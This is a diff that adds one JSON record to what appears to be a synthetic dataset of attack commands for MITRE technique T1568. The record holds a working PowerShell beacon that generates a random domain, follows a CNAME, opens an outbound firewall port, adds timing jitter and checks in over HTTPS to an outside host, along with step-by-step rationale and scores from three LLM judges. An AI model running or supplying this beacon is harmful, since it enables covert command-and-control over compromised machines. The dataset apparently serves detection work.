@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('up{0}.edge-link.co' -f (Get-Random -Min 100 -Max 999)); $cn=Resolve-DnsName $dom -Type CNAME -ErrorAction SilentlyContinue; $target=if($cn){ $cn[0].NameHost.TrimEnd('.') } else { $dom }; $ip=(Resolve-DnsName $target -Type A -Server '9.9.9.9' -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress; if($ip){ netsh advfirewall firewall add rule name='out_10443' dir=out action=allow protocol=TCP remoteport=10443 | Out-Null; Start-Sleep -Milliseconds (Get-Random -Min 250 -Max 1550); Invoke-WebRequest -Uri ('https://{0}:10443/tele' -f $target) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 7 } }",
+  "explanation": "Resolves a DGA host that may CNAME to an edge host, follows the CNAME to obtain an A record, opens port 10443, adds jitter, and initiates the HTTPS check-in.",
+  "rationale_steps": [
+    "Generate a DGA domain and check for CNAME indirection.",
+    "Resolve the ultimate A record through the indirection chain.",
+    "Permit outbound egress on a non-standard TLS port.",
+    "Contact the target with timing jitter to reduce pattern detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-fcbe818c",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced braces/quotes, valid parameters, and correct use of Resolve-DnsName, indexing, and pipelines.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a domain, follows CNAME to A resolution, adds jitter, and performs an HTTPS check-in consistent with T1568, but the firewall rule likely requires elevation and is operationally unnecessary for outbound traffic.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:27:12.326695Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed PowerShell with balanced braces, parentheses, and quotes, valid cmdlet usage, proper string formatting with -f operator, and correct semicolon separators throughout the script block.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by algorithmically generating a domain with a random numeric suffix (lightweight DGA), following a CNAME chain to an edge host, using an external DNS resolver (9.9.9.9), adding randomized jitter to evade beaconing detection, opening a firewall rule for the non-standard port 10443, and performing an HTTPS check-in with a spoofed Host header — all operationally coherent and realistic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:18:59.729484Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed PowerShell with balanced braces, quotes, and valid cmdlet parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The logic perfectly demonstrates dynamic resolution and jitter, though the netsh command requires administrative privileges which contradicts the 'None' privilege metadata.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:19:01.327029Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
